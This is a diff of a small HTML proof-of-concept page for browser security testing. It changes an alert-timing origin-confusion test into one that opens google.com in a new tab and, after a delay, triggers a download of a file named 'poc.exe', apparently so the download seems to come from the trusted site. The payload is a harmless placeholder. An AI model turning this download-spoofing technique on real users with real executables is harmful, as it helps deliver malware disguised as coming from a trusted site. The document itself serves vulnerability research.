@@ -2,40 +2,49 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Alert / Tab Focus Confusion PoC</title>
+<title>Delayed Download After Tab Load (Best-effort)</title>
 <style>
-body {
-  font-family: Arial, sans-serif;
-  padding: 40px;
-}
-button {
-  padding: 14px 22px;
-  font-size: 16px;
-}
+  body { font-family: Arial, sans-serif; padding: 40px; }
+  button { padding: 14px 22px; font-size: 16px; }
+  #log { margin-top: 16px; font-size: 14px; color: #555; }
 </style>
 </head>
 <body>
 
-<h2>Alert Timing After Tab Navigation</h2>
+<h2>Delayed Download After New Tab Load</h2>
 <p>
-This test attempts to show an alert shortly after a new tab is opened.
+Klik tombol. Tab baru akan dibuka ke google.com.
+Setelah delay, download akan dipicu.
 </p>
 
-<button onclick="run()">Open Tab + Alert</button>
+<button id="run">Open Google → Delayed Download</button>
+<div id="log"></div>
 
 <script>
-function run() {
-  // 1) Open new tab first
-  window.open("https://www.google.com", "_blank");
+const log = (s) => document.getElementById('log').textContent += s + "\n";
 
-  // 2) Slight delay before alert (race window)
+document.getElementById("run").onclick = () => {
+  log("User clicked");
+
+  // 1) Buka tab baru (user gesture)
+  window.open("https://www.google.com", "_blank");
+  log("Opened new tab to google.com");
+
+  // 2) Delay cukup lama agar google.com kemungkinan sudah load penuh
+  //    (Android Chrome: 1500–3000ms biasanya cukup)
   setTimeout(() => {
-    alert(
-      "Alert from ORIGINAL origin\n\n" +
-      "JS Origin: " + location.origin
-    );
-  }, 50); // try 20–100 ms
-}
+    log("Triggering download now");
+
+    // 3) Trigger download (masih dalam gesture chain di beberapa Chrome)
+    const a = document.createElement("a");
+    a.href = "data:application/octet-stream,TEST";
+    a.download = "poc.exe";
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+
+  }, 2500); // Coba 1500–3000ms
+};
 </script>
 
 </body>
